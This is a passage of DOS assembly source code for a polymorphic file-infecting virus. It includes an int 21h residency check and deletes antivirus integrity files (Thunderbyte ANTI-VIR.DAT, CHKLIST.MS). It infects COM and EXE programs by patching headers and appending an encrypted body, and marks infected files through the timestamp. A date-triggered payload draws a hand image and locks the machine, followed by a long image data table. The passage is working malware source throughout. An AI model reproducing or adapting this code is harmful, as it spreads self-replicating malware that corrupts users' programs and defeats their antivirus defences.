;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

install_check:  cmp esi,"ANTI"                          ; Is it our check?
                je reponde_cabron
                jmp crypt_leave21h
reponde_cabron: pushf                                   ; Interrupt 21h
                call dword ptr cs:[old21h]              
                mov esi,"ETA!"                          ; I am here!!!
                iret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Store name of the file to execute                                        ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

crypt_area03h   equ this byte
store_filename: db 0EBh,00h                             ; Clear prefetch
                cmp ah,6Ch                              ; Extended open?
                je is_extended                
                mov si,dx
is_extended:    push cs
                pop es                     
                cmp ah,4Bh                              ; Execute?
                jne use_openbuff
                mov di,offset exec_filename             ; File to execute
                jmp ok_buff_off
use_openbuff:   mov di,offset open_filename             ; File to open
ok_buff_off:    push di
                mov ah,60h                              ; Get complete
                int 21h                                 ; filename
                push cs
                pop ds 
                call hook_24h_03h
                pop si                
                mov dx,offset del_this_shit01           ; Delete Thunderbyte
                call delete_file                        ; ANTI-VIR.DAT files
                mov dx,offset del_this_shit02           ; And CHKLIST.MS shit
                call delete_file
                call free_24h_03h
                jmp exit21h

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ File infection                                                           ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

infect_program: db 0EBh,00h                             ; Clear prefetch
                push cs
                pop ds
                call hook_24h_03h
                cmp ah,4Ch                              ; Terminate?
                jne infect_close
                mov si,offset exec_filename             ; Filename off to SI
                jmp ok_infect_off
infect_close:   mov si,offset open_filename             ; Filename off to SI
ok_infect_off:  mov ah,19h                              ; Get current drive
                int 03h
                add al,"A"
                cmp byte ptr ds:[si],al                 ; Infect files only
                jne exit_inf                            ; in current drive
                mov bx,si                               ; Position of \
                mov dx,si                               ; For later use
                mov cx,0080h                            ; Max path
                cld
next_char:      lodsb                                   ; Get character
                cmp al,"\"
                je found_slash
                or al,al                                ; End of string?
                je found_00h
                cmp al,"V"                              ; Is char a V?
                je exit_inf             
                cmp al,"0"                              ; Is char a digit?
                jb ok_character
                cmp al,"9"
                jbe exit_inf
ok_character:   loop next_char
                jmp short exit_inf
found_slash:    mov bx,si
                jmp short ok_character
found_00h:      mov eax,dword ptr ds:[bx]               ; Get file name
                cmp ax,"BT"                             ; Thunderbyte utils?
                je exit_inf
                cmp eax,"NACS"                          ; SCAN.EXE?
                je exit_inf
                cmp eax,".NIW"                          ; WIN.COM?
                je exit_inf
                cmp eax,"MMOC"                          ; COMMAND.COM?
                je exit_inf
                mov eax,dword ptr ds:[si-05h]           ; Get extension
                cmp eax,"MOC."                          ; Is it a COM file?
                je go_into_file
                cmp eax,"EXE."                          ; What about EXE?
                je go_into_file
exit_inf:       call free_24h_03h                       ; Restore ints
                jmp exit21h                             ; 3, 24h and exit
go_into_file:   mov ax,4300h                            ; Get file attrib
                int 03h
                jc exit_inf
                mov word ptr ds:[file_attr],cx          ; Save it
                mov ax,4301h                            ; Clear attributes
                xor cx,cx
                int 03h
                jc exit_inf
                mov ax,3D02h                            ; Open file r/w
                int 03h
                jnc save_date_time
file_error_1:   mov ax,4301h                            ; Restore saved
                mov cx,word ptr ds:[file_attr]          ; file attribute
                int 03h
                jmp short exit_inf
save_date_time: xchg bx,ax                              ; Get handle
                mov ax,5700h                            ; Get date/time
                int 03h
                jnc done_date_time
file_error_2:   mov ah,3Eh                              ; If error, close
                int 03h                                 ; file and restore
                jmp short file_error_1                  ; attribute
done_date_time: mov word ptr ds:[file_time],cx          ; Save file time
                mov word ptr ds:[file_date],dx          ; Save file date
                and cl,1Fh                              ; Check if file is
                cmp cl,0Ah                              ; already infected
                je file_error_3
                mov ah,3Fh                              ; Read file header
                mov cx,001Ch
                mov dx,offset inf_header
                mov si,dx
                int 03h
                jc file_error_3
                call seek_end                           ; Seek to EOF and
                jc file_error_3                         ; get file size
                mov ax,word ptr ds:[file_size]
                mov dx,word ptr ds:[file_size+02h]      
                or dx,dx
                jnz ok_min_size
                cmp ax,inf_byte_size                    ; Too small file?
                jb file_error_3
ok_min_size:    mov ax,word ptr ds:[si]
                add al,ah
                cmp al,"M"+"Z"
                je inf_exe_file
                jmp inf_com_file
file_error_3:   mov ax,5701h
                mov cx,word ptr ds:[file_time]          ; Restore time
                mov dx,word ptr ds:[file_date]          ; And date
                int 03h
                jmp file_error_2

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Infect COM files                                                         ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

inf_com_file:   or dx,dx                                ; Huh? this COM
                jnz file_error_3                        ; file is strange...
                mov ax,word ptr ds:[file_size]          ; Avoid too big COM
                cmp ax,0FFFFh-(inf_byte_size+02h)       ; files
                jae file_error_3
                call backup_header                      ; Save header
                sub ax,03h                              ; Write a jump
                mov byte ptr ds:[si+00h],0E9h           ; to the viral code
                mov word ptr ds:[si+01h],ax
                add ax,0103h
                mov word ptr ds:[delta],ax              ; Save delta offsets
                mov dword ptr ds:[host_type],".COM"     ; Set host type
                jmp write_body

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Infect EXE files                                                          ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

inf_exe_file:   cmp word ptr ds:[si+19h],0040h          ; Avoid Windows shit
                jae file_error_3
                cmp word ptr ds:[si+1Ah],0000h          ; Avoid overlays
                jne file_error_3
                cmp word ptr ds:[si+0Ch],0FFFFh         ; Check maxmem
                jne file_error_3
                call backup_header                      ; Save header
                push word ptr ds:[si+14h]               ; Build a jump to
                pop word ptr ds:[exe_ip_cs]             ; the original entry
                push word ptr ds:[si+16h]               ; point
                pop word ptr ds:[exe_ip_cs+02h]
                mov ax,word ptr ds:[file_size]          ; Get file size
                mov dx,word ptr ds:[file_size+02h]      ; div 0010h
                mov cx,0010h
                div cx
                sub ax,word ptr ds:[si+08h]             ; Sub header size
                mov word ptr ds:[si+14h],dx             ; New entry point at
                mov word ptr ds:[si+16h],ax             ; file end
                mov word ptr ds:[delta],dx              ; Save delta offset
                inc ax                                  ; New stack segment
                mov word ptr ds:[si+0Eh],ax             ; in load module
                add dx,inf_byte_size+0200h              ; Move stack pointer
                and dx,0FFFEh                           ; using word aligment
                mov word ptr ds:[si+10h],dx
                mov ax,word ptr ds:[file_size]          ; Get file size
                mov dx,word ptr ds:[file_size+02h]      ; div 0200h
                mov cx,0200h
                div cx
                or dx,dx
                jz size_round_1
                inc ax
size_round_1:   cmp ax,word ptr ds:[si+04h]             ; Check if file
                jne exit_header                         ; size is as header
                cmp dx,word ptr ds:[si+02h]             ; says
                je ok_file_size
exit_header:    jmp file_error_3
ok_file_size:   mov dword ptr ds:[host_type],".EXE"     ; Set host type

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Append virus body to our victim                                          ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

write_body:     push bx
                mov si,inf_para_size*02h                ; Allocate memory
                call mem_alloc                          ; for poly decryptor
                pop bx                                  ; and virus body
                or di,di
                jz no_memory
                push bx
                mov es,di
                xor di,di
                call gen_polymorph
                add word ptr ds:[delta],di              ; Save delta offset
                mov ax,word ptr ds:[eng_entry_point]
                mov si,offset inf_header
                cmp dword ptr ds:[host_type],".EXE"
                je fix_exe
fix_com:        add word ptr ds:[si+01h],ax             ; Add to jmp
                jmp short entry_size_fix
fix_exe:        add word ptr ds:[si+14h],ax             ; Add to IP
                mov ax,word ptr ds:[file_size]          ; Get file size
                mov dx,word ptr ds:[file_size+02h]
                add ax,inf_byte_size                    ; Add virus size
                adc dx,0000h                            ; to file size
                add ax,di                               ; Add decryptor size
                adc dx,0000h                            ; to file size
                mov cx,0200h                            ; Get infected file
                div cx                                  ; size div 0200h
                or dx,dx
                jz size_round_2
                inc ax
size_round_2:   mov word ptr ds:[si+02h],dx             ; Store new size
                mov word ptr ds:[si+04h],ax             ; on header
entry_size_fix: xor si,si
                mov cx,inf_byte_size
                rep movsb
                push di
                push es
                pop ds
                call crypto03h                          ; Crypt area 03h
                call crypto02h                          ; Crypt area 02h
                call crypto01h                          ; Crypt area 01h
                call gen_encryption
                mov ah,40h                              ; Write virus body
                pop cx                                  ; at EOF
                pop bx
                xor dx,dx                
                int 03h
                jc no_write
                call seek_begin                         
                push cs
                pop ds                                  
                mov ah,40h                              ; Write infected
                mov cx,001Ch                            ; header
                mov dx,offset inf_header
                int 03h
                mov al,byte ptr ds:[file_time]          ; Mark file as
                and al,0E0h                             ; infected using
                or al,0Ah                               ; time stamp
                mov byte ptr ds:[file_time],al          ; (seconds=0Ah)
no_write:       mov ah,49h                              ; Free allocated
                int 03h                                 ; memory
                push cs                                 
                pop ds
                mov word ptr ds:[crypt_delta],0000h     ; Clear crypt delta
no_memory:      jmp file_error_3

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Time for activation?                                                     ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

try_activation: db 0EBh,00h                             ; Clear prefetch
                mov ah,04h                              ; Check if time
                int 1Ah                                 ; to activate
                cmp dx,0710h
                jne drop_virus

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Activation routine                                                       ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

do_payload:     mov ax,0013h                            ; Set video mode
                int 10h                                 ; 320x200x256c
                mov ax,0A000h                           ; Decompress our
                mov es,ax                               ; image over video
                mov si,offset image_data                ; memory
                xor di,di
                mov cx,100                              ; 100 scan lines
loop_compress:  push cx
                mov cx,20
next_string:    push cx
                lodsb
                mov dl,al
                mov cx,8                                ; Get 8 pixels
compress_byte:  xor al,al
                test dl,128
                jz pixel_ready
                mov al,07h
pixel_ready:    push di
                add di,320
                stosb
                stosb
                pop di
                stosb
                stosb
                shl dl,01h
                loop compress_byte                      ; Next pixel
                pop cx                                  ; Next 8 byte group
                loop next_string
                pop cx                                  ; Next scan
                add di,320
                loop loop_compress
stay_quiet:     jmp stay_quiet

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Image for the virus payload (white hand)                                 ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

image_data      equ this byte
    db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
    db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
    db 001h,0FEh,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
    db 000h,000h,000h,000h,000h,000h,007h,0FEh,000h,000h,000h,000h,000h,000h
    db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,00Fh,0FEh
    db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
    db 000h,000h,000h,000h,03Fh,0FEh,000h,000h,000h,000h,00Fh,0F0h,000h,000h
    db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,07Fh,0FEh,000h,000h
    db 000h,000h,0FFh,0F8h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
    db 000h,001h,0FFh,0FEh,000h,000h,000h,001h,0FFh,0F8h,000h,000h,000h,000h
    db 000h,000h,000h,000h,000h,000h,000h,003h,0FFh,0FCh,000h,000h,000h,003h
    db 0FFh,0F8h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,00Fh
    db 0FFh,0FCh,000h,000h,000h,00Fh,0FFh,0F8h,000h,000h,000h,000h,000h,000h
    db 000h,000h,000h,000h,000h,01Fh,0FFh,0FCh,000h,000h,000h,03Fh,0FFh,0F8h
    db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,03Fh,0FFh,0FCh
    db 000h,000h,000h,0FFh,0FFh,0F0h,000h,000h,000h,000h,000h,000h,000h,000h
    db 000h,000h,000h,07Fh,0FFh,0FCh,000h,000h,003h,0FFh,0FFh,0F0h,000h,000h
    db 000h,000h,000h,000h,000h,000h,000h,000h,000h,0FFh,0FFh,0F8h,000h,000h
    db 00Fh,0FFh,0FFh,0E0h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
    db 001h,0FFh,0FFh,0F0h,000h,000h,03Fh,0FFh,0FFh,0E0h,000h,000h,000h,000h
    db 000h,000h,000h,000h,000h,000h,003h,0FFh,0FFh,0E0h,000h,000h,07Fh,0FFh
    db 0FFh,080h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,01Fh,0FFh
    db 0FFh,0C0h,000h,001h,0FFh,0FFh,0FFh,000h,000h,000h,000h,000h,000h,000h
    db 000h,000h,000h,000h,03Fh,0FFh,0FFh,0C0h,000h,007h,0FFh,0FFh,0FCh,000h
    db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,07Fh,0FFh,0FFh,080h
    db 000h,01Fh,0FFh,0FFh,0F8h,000h,000h,000h,000h,000h,000h,000h,000h,000h
    db 000h,000h,07Fh,0FFh,0FEh,000h,000h,03Fh,0FFh,0FFh,0F0h,000h,000h,000h
    db 000h,000h,000h,000h,000h,000h,000h,000h,0FFh,0FFh,0FCh,000h,000h,0FFh
    db 0FFh,0FFh,0C0h,000h,003h,0F0h,000h,000h,000h,000h,000h,000h,000h,003h
    db 0FFh,0FFh,0F8h,000h,001h,0FFh,0FFh,0FFh,080h,000h,01Fh,0F8h,000h,000h
    db 000h,000h,000h,000h,000h,00Fh,0FFh,0FFh,0F0h,000h,003h,0FFh,0FFh,0FFh
    db 000h,001h,0FFh,0F8h,000h,000h,000h,000h,000h,000h,000h,01Fh,0FFh,0FFh
    db 0C0h,000h,007h,0FFh,0FFh,0FCh,000h,007h,0FFh,0F0h,000h,000h,000h,000h
    db 000h,000h,000h,01Fh,0FFh,0FFh,080h,000h,01Fh,0FFh,0FFh,0E0h,000h,03Fh
    db 0FFh,0F0h,000h,000h,000h,000h,000h,000h,000h,07Fh,0FFh,0FFh,000h,000h
    db 03Fh,0FFh,0FFh,080h,000h,07Fh,0FFh,0E0h,000h,000h,000h,000h,000h,000h
    db 000h,0FFh,0FFh,0FEh,000h,003h,0FFh,0FFh,0FEh,000h,001h,0FFh,0FFh,0C0h
    db 000h,000h,000h,000h,000h,000h,001h,0FFh,0FFh,0FEh,000h,007h,0FFh,0FFh
    db 0F8h,000h,003h,0FFh,0FFh,0C0h,000h,000h,000h,000h,000h,000h,001h,0FFh
    db 0FFh,0FCh,000h,00Fh,0FFh,0FFh,0F0h,000h,007h,0FFh,0FFh,080h,000h,000h
    db 000h,000h,000h,000h,003h,0FFh,0FFh,0F8h,000h,03Fh,0FFh,0FFh,0E0h,000h
    db 01Fh,0FFh,0FEh,000h,000h,000h,000h,000h,000h,000h,003h,0FFh,0FFh,0E0h
    db 000h,07Fh,0FFh,0FFh,0C0h,000h,07Fh,0FFh,0F8h,000h,000h,000h,000h,000h
    db 000h,000h,007h,0FFh,0FFh,0C0h,000h,0FFh,0FFh,0FFh,000h,001h,0FFh,0FFh
    db 0F0h,000h,000h,000h,000h,000h,000h,000h,00Fh,0FFh,0FFh,080h,001h,0FFh
    db 0FFh,0FCh,000h,003h,0FFh,0FFh,0E0h,000h,000h,000h,000h,000h,000h,000h
    db 03Fh,0FFh,0FCh,000h,007h,0FFh,0FFh,0F8h,000h,00Fh,0FFh,0FFh,000h,000h
    db 000h,000h,000h,000h,000h,000h,07Fh,0FFh,0F8h,000h,00Fh,0FFh,0FFh,0F0h
    db 000h,01Fh,0FFh,0FFh,000h,000h,000h,000h,000h,000h,000h,000h,07Fh,0FFh
    db 0F8h,000h,0FFh,0FFh,0FFh,0E0h,000h,07Fh,0FFh,0FEh,000h,000h,000h,000h
    db 000h,000h,000h,000h,07Fh,0FFh,0FCh,03Fh,0FFh,0FFh,0FFh,000h,003h,0FFh
    db 0FFh,0FCh,000h,000h,000h,000h,000h,000h,000h,000h,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FEh,000h,00Fh,0FFh,0FFh,0F8h,000h,000h,000h,000h,000h,000h
    db 000h,001h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0F8h,000h,01Fh,0FFh,0FFh,0F0h
    db 000h,000h,000h,000h,000h,000h,000h,007h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0F0h,001h,0FFh,0FFh,0FFh,0E0h,000h,003h,0F0h,000h,000h,000h,000h,00Fh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0E0h,007h,0FFh,0FFh,0FFh,080h,000h,00Fh
    db 0FCh,000h,000h,000h,000h,01Fh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0E0h,0FFh
    db 0FFh,0FFh,0FFh,000h,000h,03Fh,0FCh,000h,000h,000h,000h,03Fh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0EFh,0FFh,0FFh,0FFh,0FCh,000h,000h,07Fh,0FCh,000h
    db 000h,000h,000h,03Fh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0E0h,000h,000h,0FFh,0F8h,000h,000h,000h,000h,07Fh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0C0h,000h,007h,0FFh,0F8h,000h,000h,000h
    db 000h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,000h,000h
    db 0FFh,0FFh,0F8h,000h,000h,000h,001h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FEh,000h,001h,0FFh,0FFh,0F8h,000h,000h,000h,003h,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0F8h,000h,003h,0FFh,0FFh
    db 0F8h,000h,000h,000h,007h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0C0h,000h,03Fh,0FFh,0FFh,0F0h,000h,000h,000h,00Fh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,000h,007h,0FFh,0FFh,0FFh,0E0h,000h
    db 000h,000h,01Fh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0F8h,000h
    db 07Fh,0FFh,0FFh,0FFh,0C0h,000h,000h,000h,03Fh,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0F0h,000h,0FFh,0FFh,0FFh,0FFh,000h,000h,000h,000h
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,000h,003h,0FFh,0FFh
    db 0FFh,0FCh,000h,000h,000h,003h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0F8h,000h,01Fh,0FFh,0FFh,0FFh,0E0h,000h,000h,000h,003h,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0F0h,001h,0FFh,0FFh,0FFh,0FFh,080h
    db 000h,000h,000h,007h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0E0h
    db 007h,0FFh,0FFh,0FFh,0FEh,000h,000h,000h,000h,007h,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0E0h,01Fh,0FFh,0FFh,0FFh,0F8h,000h,000h,000h
    db 000h,007h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0E0h,07Fh,0FFh
    db 0FFh,0FFh,0C0h,000h,000h,000h,000h,007h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,080h,000h,000h,000h,000h,00Fh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FCh
    db 000h,000h,000h,000h,000h,01Fh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0F8h,000h,000h,000h,000h,000h,03Fh,0F0h,0F1h
    db 0C8h,004h,07Fh,0FEh,002h,001h,087h,0FFh,0FFh,0FFh,0FFh,0E0h,000h,000h
    db 000h,000h,000h,07Fh,0F0h,071h,0C8h,004h,07Fh,0FEh,002h,001h,007h,0FFh
    db 0FFh,0FFh,0FFh,080h,000h,000h,000h,000h,000h,0FFh,0E0h,070h,0CFh,01Ch
    db 07Fh,0FEh,03Fh,08Fh,003h,0FFh,0FFh,0FFh,0FFh,000h,000h,000h,000h,000h
    db 001h,0FFh,0E2h,070h,04Fh,01Ch,07Fh,0FEh,003h,08Fh,023h,0FFh,0FFh,0FFh
    db 0FEh,000h,000h,000h,000h,000h,001h,0FFh,0E2h,032h,00Fh,01Ch,07Ch,03Eh
    db 003h,08Eh,023h,0FFh,0FFh,0FFh,0F8h,000h,000h,000h,000h,000h,001h,0FFh
    db 0C0h,033h,00Fh,01Ch,07Ch,03Eh,03Fh,08Eh,001h,0FFh,0FFh,0FFh,0C0h,000h
    db 000h,000h,000h,000h,001h,0FFh,0C0h,013h,08Fh,01Ch,07Fh,0FEh,003h,08Ch
    db 001h,0FFh,0FFh,0FFh,080h,000h,000h,000h,000h,000h,001h,0FFh,0C7h,013h
    db 08Fh,01Ch,07Fh,0FEh,003h,08Ch,071h,0FFh,0FFh,0F0h,000h,000h,000h,000h
    db 000h,000h,001h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0E0h,000h,000h,000h,000h,000h,000h,001h,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,000h,000h,000h,000h,000h,000h,000h
    db 001h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0F8h,000h
    db 000h,000h,000h,000h,000h,000h,001h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0E0h,000h,000h,000h,000h,000h,000h,000h,001h,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,080h,000h,000h,000h
    db 000h,000h,000h,000h,000h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0F8h,000h,000h,000h,000h,000h,000h,000h,000h,000h,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0E0h,000h,000h,000h,000h,000h,000h
    db 000h,000h,000h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,080h
    db 000h,000h,000h,000h,000h,000h,000h,000h,000h,07Fh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,000h,000h,000h,000h,000h,000h,000h,000h,000h
    db 000h,03Fh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0F8h,000h,000h,000h
    db 000h,000h,000h,000h,000h,000h,000h,01Fh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0E0h,000h,000h,000h,0FFh,0C0h,000h,000h,000h,000h,000h,007h
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0E0h,000h,001h,0FFh,0FFh,0E0h
    db 000h,000h,000h,000h,000h,007h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0E0h,000h,03Fh,0FFh,0FFh,0E0h,000h,000h,000h,000h,000h,007h,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0E0h,003h,0FFh,0FFh,0FFh,0E0h,000h,000h
    db 000h,000h,000h,003h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0C0h,03Fh
    db 0FFh,0FFh,0FFh,0E0h,000h,000h,000h,000h,000h,001h,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0C0h,07Fh,0FFh,0FFh,0FFh,0E0h,000h,000h,000h,000h
    db 000h,000h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0E1h,0FFh,0FFh,0FFh
    db 0FFh,0C0h,000h,000h,000h,000h,000h,000h,007h,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0C0h,000h,000h,000h,000h,000h,000h
    db 003h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,000h
    db 000h,000h,000h,000h,000h,000h,003h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FCh,000h,000h,000h,000h,000h,000h,000h,003h,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0F8h,000h,000h,000h
    db 000h,000h,000h,000h,001h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0C0h,000h,000h,000h,000h,000h,000h,000h,001h,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,080h,000h,000h,000h,000h,000h
